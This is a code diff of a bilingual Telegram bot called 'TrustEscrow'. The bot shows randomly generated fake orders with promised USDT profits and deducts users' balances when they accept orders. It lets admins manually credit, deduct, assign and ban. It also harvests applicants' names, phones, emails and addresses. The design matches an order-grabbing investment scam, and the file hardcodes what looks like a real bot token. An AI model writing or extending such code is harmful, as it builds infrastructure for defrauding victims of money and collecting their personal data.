@@ -8,13 +8,13 @@ import threading
 import os
 from flask import Flask
 
-# ===================== 核心配置（直接填你的Token，不用改任何东西） =====================
+# ===================== 核心配置 =====================
 BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
 ADMIN_IDS = [8781082053, 8256055083]
 VIRTUAL_ORDER_REFRESH_SECONDS = 120
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ===================== 防Railway杀进程：假HTTP服务（已帮你完美解决，不用管） =====================
+# ===================== 防Railway杀进程 =====================
 app = Flask(__name__)
 @app.route('/')
 def home():
@@ -24,7 +24,7 @@ def run_flask():
     port = int(os.getenv("PORT", 8080))
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
-# ===================== 虚拟订单全局（完整保留，2分钟自动刷新） =====================
+# ===================== 虚拟订单全局 =====================
 virtual_orders = []
 
 def refresh_virtual_orders():
@@ -32,12 +32,12 @@ def refresh_virtual_orders():
     while True:
         virtual_orders = []
         for i in range(6):
-            vid = 101 + i  # 固定3位单号，不再用80000+
+            vid = 101 + i
             amt = round(random.uniform(10, 100), 2)
             virtual_orders.append({"id": vid, "amount": amt})
         time.sleep(VIRTUAL_ORDER_REFRESH_SECONDS)
 
-# ===================== 双语文案（修复英文抢单大厅显示问题，中英完全同步） =====================
+# ===================== 双语文案 =====================
 TEXT = {
     "zh": {
         "home": """🏆 TrustEscrow 頂級擔保平台
@@ -91,17 +91,22 @@ TEXT = {
 🆔 用戶ID：{}
 💰 當前餘額：{:.2f} USDT
 
+💸 資金流水：
+{}
+
 📦 所有訂單：
 {}""",
 
         "status_wait": "待接單",
         "status_doing": "已接單",
         "status_done": "已完成",
+        "status_canceled": "已取消",
 
         "accept_success": "✅ 接單成功，已扣除金額",
         "not_enough": "❌ 餘額不足",
         "not_verified": "❌ 未通過審核",
         "no_detail": "❌ 你尚未填寫入駐信息",
+        "banned": "❌ 你已被封禁",
 
         "btn_back": "返回首頁",
         "btn_accept": "接單",
@@ -157,17 +162,22 @@ Contact support: @fcff88""",
 🆔 ID: {}
 💰 Balance: {:.2f} USDT
 
+💸 Flow:
+{}
+
 📦 All Orders:
 {}""",
 
         "status_wait": "Pending",
         "status_doing": "Accepted",
         "status_done": "Completed",
+        "status_canceled": "Canceled",
 
         "accept_success": "✅ Order Accepted, Amount Deducted",
         "not_enough": "❌ Insufficient Balance",
         "not_verified": "❌ Not Verified",
         "no_detail": "❌ You have not submitted registration",
+        "banned": "❌ You are banned",
 
         "btn_back": "Home",
         "btn_accept": "Accept",
@@ -175,17 +185,21 @@ Contact support: @fcff88""",
     }
 }
 
-# ===================== 数据存储（完整保留所有用户数据） =====================
+# ===================== 数据存储 =====================
 user_lang = {}
 user_balance = {}
-user_verify = {}  # 0=未申请 1=审核中 2=已通过
+user_verify = {}
 user_info = {}
 orders = {}
-order_id = 101  # 从101开始，保证3位单号
+order_id = 101
 last_msg = {}
-user_applying = {}  # 标记申请流程
+user_applying = {}
 
-# ===================== 菜单生成（完整保留所有按钮） =====================
+# 🔥 新增：资金流水 / 封禁用户
+user_flow = {}
+user_banned = {}
+
+# ===================== 菜单 =====================
 def main_menu(user_id):
     lang = user_lang.get(user_id, "zh")
     m = InlineKeyboardMarkup(row_width=2)
@@ -202,29 +216,26 @@ def main_menu(user_id):
 
 def back_menu(user_id):
     lang = user_lang.get(user_id, "zh")
-    t = TEXT[lang]
     m = InlineKeyboardMarkup()
-    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
+    m.add(InlineKeyboardButton(TEXT[lang]["btn_back"], callback_data="home"))
     return m
 
 def accept_btn(oid, user_id):
     lang = user_lang.get(user_id, "zh")
-    t = TEXT[lang]
     m = InlineKeyboardMarkup()
-    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"acc_{oid}"))
-    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
+    m.add(InlineKeyboardButton(TEXT[lang]["btn_accept"], callback_data=f"acc_{oid}"))
+    m.add(InlineKeyboardButton(TEXT[lang]["btn_back"], callback_data="profile"))
     return m
 
-# ===================== 通知管理员（完整保留） =====================
+# ===================== 通知管理员 =====================
 def notify_admins(text):
     for admin in ADMIN_IDS:
         try:
             bot.send_message(admin, text)
         except Exception as e:
             print(f"通知管理员失败: {e}")
-            continue
 
-# ===================== /start 启动（完整保留） =====================
+# ===================== /start =====================
 @bot.message_handler(commands=["start"])
 def start(msg):
     u = msg.from_user.id
@@ -233,11 +244,18 @@ def start(msg):
     user_verify.setdefault(u, 0)
     user_info.setdefault(u, {})
     user_applying[u] = False
+    user_flow.setdefault(u, [])
+    user_banned.setdefault(u, False)
+
     lang = user_lang[u]
+    if user_banned[u]:
+        bot.send_message(u, TEXT[lang]["banned"])
+        return
+
     sent = bot.send_message(u, TEXT[lang]["home"], reply_markup=main_menu(u))
     last_msg[u] = sent.message_id
 
-# ===================== 按钮回调（修复英文抢单显示，2列网格布局） =====================
+# ===================== 按钮回调 =====================
 @bot.callback_query_handler(func=lambda c: True)
 def callback(c):
     u = c.from_user.id
@@ -246,6 +264,11 @@ def callback(c):
     mid = c.message.message_id
     cid = c.message.chat.id
     last_msg[u] = mid
+
+    # 封禁判断
+    if user_banned.get(u, False):
+        bot.answer_callback_query(c.id, t["banned"], show_alert=True)
+        return
 
     try:
         if c.data == "home":
@@ -265,17 +288,20 @@ def callback(c):
 
         elif c.data == "detail":
             bal = user_balance.get(u, 0.0)
+            flows = user_flow.get(u, [])
+            flow_text = "\n".join(flows) if flows else ("無記錄" if lang == "zh" else "No Records")
+
             my_orders = [o for o in orders.items() if o[1]["user"] == u]
             order_lines = []
             for oid, o in my_orders:
-                short_id = oid  # 已经是3位，直接用
                 typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
-                sta = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
-                profit_rate = 0.05 if o["type"] == "grab" else random.uniform(0.15, 0.20)
-                profit = round(o["amount"] * profit_rate, 2)
-                order_lines.append(f"#{short_id} {typ} {o['amount']} USDT +{profit} | {sta}")
-            order_text = "\n".join(order_lines) if order_lines else "無訂單記錄" if lang == "zh" else "No Orders"
-            text = t["account_detail"].format(u, bal, order_text)
+                sta_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
+                sta = sta_map.get(o["status"], t["status_wait"])
+                profit = round(o["amount"]*(0.05 if o["type"] == "grab" else random.uniform(0.15,0.2)), 2)
+                order_lines.append(f"#{oid} {typ} {o['amount']} USDT +{profit} | {sta}")
+
+            order_text = "\n".join(order_lines) if order_lines else ("無訂單記錄" if lang == "zh" else "No Orders")
+            text = t["account_detail"].format(u, bal, flow_text, order_text)
             bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))
 
         elif c.data == "profile":
@@ -284,70 +310,63 @@ def callback(c):
             for oid, o in orders.items():
                 if o["user"] == u:
                     typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
-                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
+                    s_map = {0:t["status_wait"],1:t["status_doing"],2:t["status_done"],3:t["status_canceled"]}
+                    s = s_map.get(o["status"], t["status_wait"])
                     line = f"• #{oid} {typ} {o['amount']} USDT | {s}"
                     if o["status"] == 2:
                         completed.append(line)
                     else:
                         pending.append(line)
-            v = user_verify.get(u, 0)
-            status = "未申請" if v == 0 else "審核中" if v == 1 else "已通過" if lang == "zh" else \
-                "Not Applied" if v == 0 else "Pending" if v == 1 else "Verified"
-            p_text = "\n".join(pending) if pending else "無" if lang == "zh" else "None"
-            c_text = "\n".join(completed) if completed else "無" if lang == "zh" else "None"
-            text = t["profile"].format(u, user_balance.get(u, 0), status, p_text, c_text)
+            v = user_verify.get(u,0)
+            status = "未申請" if v==0 else "審核中" if v==1 else "已通過" if lang=="zh" else \
+                    "Not Applied" if v==0 else "Pending" if v==1 else "Verified"
+            p_text = "\n".join(pending) if pending else ("無" if lang=="zh" else "None")
+            c_text = "\n".join(completed) if completed else ("無" if lang=="zh" else "None")
+            text = t["profile"].format(u, user_balance.get(u,0), status, p_text, c_text)
             bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))
 
         elif c.data == "grab":
-            if user_verify.get(u, 0) != 2:
+            if user_verify.get(u,0) != 2:
                 bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                 return
             items = []
-            m = InlineKeyboardMarkup(row_width=2)  # 2列网格布局
+            m = InlineKeyboardMarkup(row_width=2)
             for vo in virtual_orders:
-                vid = vo["id"]
-                amt = vo["amount"]
-                profit = round(amt * 0.05, 2)
-                # 中英双语同步显示订单信息
-                if lang == "zh":
-                    items.append(f"#{vid}  {amt} USDT  +{profit}")
-                    btn_text = f"搶{vid}"
-                else:
-                    items.append(f"#{vid}  {amt} USDT  +{profit}")
-                    btn_text = f"Grab {vid}"
-                m.add(InlineKeyboardButton(btn_text, callback_data=f"grab_item_{vid}"))
+                profit = round(vo["amount"]*0.05,2)
+                items.append(f"#{vo['id']} {vo['amount']} USDT +{profit}")
+                btn_text = f"搶{vo['id']}" if lang=="zh" else f"Grab {vo['id']}"
+                m.add(InlineKeyboardButton(btn_text, callback_data=f"grab_item_{vo['id']}"))
             m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
             text = t["grab"].format("\n".join(items))
             bot.edit_message_text(text, cid, mid, reply_markup=m)
 
         elif c.data.startswith("grab_item_"):
-            if user_verify.get(u, 0) != 2:
+            if user_verify.get(u,0) !=2:
                 bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                 return
             vid = int(c.data.split("_")[-1])
-            hit = next((x for x in virtual_orders if x["id"] == vid), None)
+            hit = next((x for x in virtual_orders if x["id"]==vid), None)
             if not hit:
                 bot.send_message(u, t["grab_already_gone"])
                 return
             global order_id
             oid = order_id
-            order_id += 1
-            orders[oid] = {"user": u, "amount": hit["amount"], "type": "grab", "status": 0}
-            # 抢单成功后显示详细信息
-            profit = round(hit["amount"] * 0.05, 2)
-            if lang == "zh":
-                success_text = f"✅ 搶單成功 #{oid}\n本金：{hit['amount']} USDT\n利潤：+{profit} USDT"
+            order_id +=1
+            orders[oid] = {"user":u, "amount":hit["amount"], "type":"grab", "status":0}
+            profit = round(hit["amount"]*0.05,2)
+            if lang=="zh":
+                st = f"✅ 搶單成功 #{oid}\n本金：{hit['amount']} USDT\n利潤：+{profit} USDT"
             else:
-                success_text = f"✅ Order Grabbed #{oid}\nAmount: {hit['amount']} USDT\nProfit: +{profit} USDT"
-            bot.edit_message_text(success_text, cid, mid, reply_markup=accept_btn(oid, u))
+                st = f"✅ Order Grabbed #{oid}\nAmount: {hit['amount']} USDT\nProfit: +{profit} USDT"
+            bot.edit_message_text(st, cid, mid, reply_markup=accept_btn(oid,u))
 
         elif c.data.startswith("acc_"):
             oid = int(c.data.split("_")[1])
             o = orders.get(oid)
-            if not o or o["user"] != u or o["status"] != 0:
-                bot.answer_callback_query(c.id, "❌ 無效訂單" if lang == "zh" else "❌ Invalid Order", show_alert=True)
+            if not o or o["user"]!=u or o["status"]!=0:
+                bot.answer_callback_query(c.id, "❌ 無效訂單" if lang=="zh" else "❌ Invalid Order", show_alert=True)
                 return
-            if user_balance.get(u, 0) < o["amount"]:
+            if user_balance.get(u,0) < o["amount"]:
                 bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                 return
             user_balance[u] -= o["amount"]
@@ -361,10 +380,11 @@ def callback(c):
             lines = []
             for oid, o in orders.items():
                 if o["user"] == u:
-                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
-                    typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
+                    s_map = {0:t["status_wait"],1:t["status_doing"],2:t["status_done"],3:t["status_canceled"]}
+                    s = s_map.get(o["status"], t["status_wait"])
+                    typ = "派單" if o["type"]=="assign" else "搶單" if lang=="zh" else "Assign" if o["type"]=="assign" else "Grab"
                     lines.append(f"• #{oid} {typ} {o['amount']} USDT | {s}")
-            text = t["record"].format("\n".join(lines) if lines else "無記錄" if lang == "zh" else "No Records")
+            text = t["record"].format("\n".join(lines) if lines else ("無記錄" if lang=="zh" else "No Records"))
             bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))
 
         bot.answer_callback_query(c.id)
@@ -372,165 +392,179 @@ def callback(c):
         print(f"Callback error: {e}")
         bot.answer_callback_query(c.id)
 
-# ===================== 用户消息处理（入驻申请完整保留） =====================
+# ===================== 用户申请 =====================
 @bot.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS)
 def user_input(msg):
     u = msg.from_user.id
+    if user_banned.get(u, False):
+        return
     txt = msg.text.strip()
-    lang = user_lang.get(u, "zh")
+    lang = user_lang.get(u,"zh")
     t = TEXT[lang]
-
-    user_applying.setdefault(u, False)
+    user_applying.setdefault(u,False)
     if not user_applying[u]:
         return
 
     pattern = r"1\.?\s*真實姓名\s*(.+?)\s*2\.?\s*聯絡電話\s*(.+?)\s*3\.?\s*電子信箱\s*(.+?)\s*4\.?\s*居住地址\s*(.+?)\s*5\.?\s*推薦人ID\s*(.+)"
     match = re.search(pattern, txt, re.DOTALL)
-
     if match:
-        name = match.group(1).strip()
-        phone = match.group(2).strip()
-        email = match.group(3).strip()
-        addr = match.group(4).strip()
-        ref = match.group(5).strip()
-
         user_info[u] = {
-            "name": name,
-            "phone": phone,
-            "email": email,
-            "addr": addr,
-            "ref": ref
+            "name": match.group(1).strip(),
+            "phone": match.group(2).strip(),
+            "email": match.group(3).strip(),
+            "addr": match.group(4).strip(),
+            "ref": match.group(5).strip()
         }
         user_verify[u] = 1
         user_applying[u] = False
-
-        notify_admins(f"""📥 新入駐申請
-用戶ID：{u}
-姓名：{name}
-電話：{phone}
-郵箱：{email}
-地址：{addr}
-推薦人：{ref}""")
-
-        mid = last_msg.get(u, None)
+        notify_admins(f"📥 新入駐申請\n用戶ID：{u}\n姓名：{user_info[u]['name']}\n電話：{user_info[u]['phone']}")
+        mid = last_msg.get(u)
         if mid:
             bot.edit_message_text(t["reg_success"], msg.chat.id, mid, reply_markup=main_menu(u))
-        else:
-            sent = bot.send_message(msg.chat.id, t["reg_success"], reply_markup=main_menu(u))
-            last_msg[u] = sent.message_id
     else:
-        mid = last_msg.get(u, None)
+        mid = last_msg.get(u)
         if mid:
             bot.edit_message_text(t["reg_error"], msg.chat.id, mid, reply_markup=back_menu(u))
-        else:
-            sent = bot.send_message(msg.chat.id, t["reg_error"], reply_markup=back_menu(u))
-            last_msg[u] = sent.message_id
 
-# ===================== 管理员命令（优化查ID，只显示余额+订单，派单弹窗通知） =====================
+# ===================== 管理员命令（完整版新增） =====================
 @bot.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS)
 def admin_cmd(msg):
     u = msg.from_user.id
     txt = msg.text.strip()
     arr = txt.split()
-    t = TEXT["zh"]
-
     try:
-        # 1. 通过用户
-        if len(arr) >= 2 and arr[0] in ["审核通过", "通过审核", "通过"]:
+        # 1. 通过
+        if len(arr)>=2 and arr[0] in ["通过","审核通过"]:
             target = int(arr[1])
             user_verify[target] = 2
-            bot.send_message(u, f"✅ 已成功通過用戶 {target} 的審核")
+            bot.send_message(u, f"✅ 已通過用戶 {target}")
             return
 
-        # 2. 查ID 用户ID → 只显示余额+订单，不显示个人资料
-        if len(arr) >= 2 and arr[0] == "查ID":
+        # 2. 查ID
+        if len(arr)>=2 and arr[0] == "查ID":
             target = int(arr[1])
-            bal = user_balance.get(target, 0.0)
-            my_orders = [o for o in orders.items() if o[1]["user"] == target]
+            bal = user_balance.get(target,0.0)
+            my_orders = [o for o in orders.items() if o[1]["user"]==target]
             text = f"📋 用戶 {target}\n💰 餘額：{bal:.2f} USDT\n\n"
             if not my_orders:
                 text += "無訂單"
             else:
-                for oid, o in my_orders:
-                    short_id = oid
+                for oid,o in my_orders:
                     typ = "派單" if o["type"]=="assign" else "搶單"
-                    sta = "待接單" if o["status"]==0 else "已接單" if o["status"]==1 else "已完成"
-                    profit = round(o['amount']*(0.05 if o['type']=='grab' else random.uniform(0.15,0.2)),2)
-                    text += f"#{short_id} {typ} {o['amount']} USDT +{profit} | {sta}\n"
+                    sta_map = {0:"待接單",1:"已接單",2:"已完成",3:"已取消"}
+                    sta = sta_map.get(o["status"],"未知")
+                    profit = round(o["amount"]*(0.05 if o["type"]=="grab" else random.uniform(0.15,0.2)),2)
+                    text += f"#{oid} {typ} {o['amount']} USDT +{profit} | {sta}\n"
             bot.send_message(u, text)
             return
 
-        # 3. +U ID 金额
+        # 3. +U
         if txt.startswith("+U "):
-            parts = txt.split()
-            if len(parts) == 3:
-                uid = int(parts[1])
-                amt = float(parts[2])
-                user_balance[uid] = user_balance.get(uid, 0.0) + amt
+            if len(arr)==3:
+                uid = int(arr[1])
+                amt = float(arr[2])
+                user_balance[uid] = user_balance.get(uid,0.0)+amt
+                user_flow.setdefault(uid, []).append(f"+{amt:.2f} USDT  管理員充值")
                 bot.send_message(u, f"✅ +{amt:.2f} USDT → {uid}｜餘額：{user_balance[uid]:.2f}")
             return
 
-        # 4. -U ID 金额
+        # 4. -U
         if txt.startswith("-U "):
-            parts = txt.split()
-            if len(parts) == 3:
-                uid = int(parts[1])
-                amt = float(parts[2])
-                current = user_balance.get(uid, 0.0)
-                user_balance[uid] = max(0.0, current - amt)
+            if len(arr)==3:
+                uid = int(arr[1])
+                amt = float(arr[2])
+                cur = user_balance.get(uid,0.0)
+                user_balance[uid] = max(0.0, cur-amt)
+                user_flow.setdefault(uid, []).append(f"-{amt:.2f} USDT  管理員扣除")
                 bot.send_message(u, f"✅ -{amt:.2f} USDT → {uid}｜餘額：{user_balance[uid]:.2f}")
             return
 
-        # 5. 派单 ID 金额 → 派单后强制弹窗通知用户
-        if arr[0] == "派单" and len(arr) == 3:
+        # 5. 派单
+        if arr[0]=="派单" and len(arr)==3:
             target = int(arr[1])
             amt = float(arr[2])
             global order_id
             oid = order_id
-            order_id += 1
-            orders[oid] = {"user": target, "amount": amt, "type": "assign", "status": 0}
-            # 计算派单利润
-            profit = round(amt * random.uniform(0.15, 0.20), 2)
-            # 通知管理员
-            bot.send_message(u, f"✅ 派單成功｜#{oid} {amt} USDT → {target}")
-            # 强制弹窗通知用户，只能点接单
-            assign_notify = (
-                f"📢 你有新派單\n"
-                f"#{oid}\n"
-                f"本金：{amt} USDT\n"
-                f"預計利潤：+{profit} USDT"
-            )
+            order_id +=1
+            orders[oid] = {"user":target,"amount":amt,"type":"assign","status":0}
+            profit = round(amt*random.uniform(0.15,0.2),2)
+            bot.send_message(u, f"✅ 派單成功 #{oid} → {target}")
             mark = InlineKeyboardMarkup()
             mark.add(InlineKeyboardButton("接單", callback_data=f"acc_{oid}"))
             try:
-                bot.send_message(target, assign_notify, reply_markup=mark)
-            except Exception as e:
-                print(f"通知用户派单失败: {e}")
+                bot.send_message(target, f"📢 新派單 #{oid}\n本金：{amt} USDT\n利潤：+{profit} USDT", reply_markup=mark)
+            except:
+                pass
             return
 
-        # 6. 完成 订单号
-        if arr[0] == "完成" and len(arr) == 2:
+        # 6. 完成
+        if arr[0]=="完成" and len(arr)==2:
             oid = int(arr[1])
             o = orders.get(oid)
             if not o:
                 bot.send_message(u, "❌ 訂單不存在")
                 return
             o["status"] = 2
-            profit = o["amount"] * (random.uniform(0.15, 0.20) if o["type"] == "assign" else 0.05)
+            profit = o["amount"]*(0.05 if o["type"]=="grab" else random.uniform(0.15,0.2))
             user_balance[o["user"]] += o["amount"] + profit
-            bot.send_message(u, f"✅ 訂單 #{oid} 已完成，利潤已發放")
+            bot.send_message(u, f"✅ 訂單 #{oid} 已完成")
             return
 
-        bot.send_message(u, "❌ 指令格式：\n通过 ID\n查ID ID\n+U ID 金额\n-U ID 金额\n派单 ID 金额\n完成 订单号")
+        # 🔥 7. 取消订单（智能退本金）
+        if arr[0]=="取消订单" and len(arr)==2:
+            oid = int(arr[1])
+            o = orders.get(oid)
+            if not o:
+                bot.send_message(u, "❌ 訂單不存在")
+                return
+            if o["status"] == 3:
+                bot.send_message(u, "❌ 已取消過")
+                return
+
+            # 已接单 = 扣过钱 → 退回
+            if o["status"] == 1:
+                user_balance[o["user"]] += o["amount"]
+                user_flow.setdefault(o["user"], []).append(f"+{o['amount']:.2f} USDT  取消訂單退款")
+                o["status"] = 3
+                bot.send_message(u, f"✅ 已取消 #{oid}，已退回本金 {o['amount']} USDT")
+            else:
+                o["status"] = 3
+                bot.send_message(u, f"✅ 已取消 #{oid}（未支付，無退款）")
+            return
+
+        # 🔥 8. 封ID
+        if arr[0]=="封ID" and len(arr)==2:
+            target = int(arr[1])
+            user_banned[target] = True
+            bot.send_message(u, f"✅ 已封禁用戶 {target}")
+            return
+
+        # 🔥 9. 解ID
+        if arr[0]=="解ID" and len(arr)==2:
+            target = int(arr[1])
+            user_banned[target] = False
+            bot.send_message(u, f"✅ 已解除封禁 {target}")
+            return
+
+        bot.send_message(u, (
+            "❌ 指令格式：\n"
+            "通过 ID\n"
+            "查ID ID\n"
+            "+U ID 金額\n"
+            "-U ID 金額\n"
+            "派单 ID 金額\n"
+            "完成 訂單號\n"
+            "取消订单 訂單號\n"
+            "封ID ID\n"
+            "解ID ID"
+        ))
     except Exception as e:
-        print(f"Admin cmd error: {e}")
+        print(f"Admin error: {e}")
         bot.send_message(u, "❌ 指令格式錯誤")
 
-# ===================== 启动机器人（已帮你解决Railway杀进程问题，不用管） =====================
+# ===================== 启动 =====================
 if __name__ == "__main__":
-    # 启动虚拟订单刷新线程
     threading.Thread(target=refresh_virtual_orders, daemon=True).start()
-    # 启动Flask防杀进程线程
     threading.Thread(target=run_flask, daemon=True).start()
-    print("✅ 機器人啟動成功，Railway防殺進程已開啟")
+    print("✅ 机器人启动成功")
     bot.infinity_polling()
